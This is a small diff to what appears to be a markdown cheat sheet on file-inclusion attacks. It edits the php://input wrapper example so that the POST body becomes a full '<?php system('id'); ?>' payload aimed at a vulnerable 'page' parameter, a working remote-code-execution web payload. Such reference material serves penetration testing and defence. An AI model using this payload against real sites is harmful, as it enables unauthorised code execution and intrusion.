@@ -186,7 +186,7 @@ Specify your payload in the POST parameters
 
 ```powershell
 http://example.com/index.php?page=php://input
-POST DATA: <? system('id'); ?>
+POST DATA: <?php system('id'); ?>
 ```
 
 ### Wrapper phar://
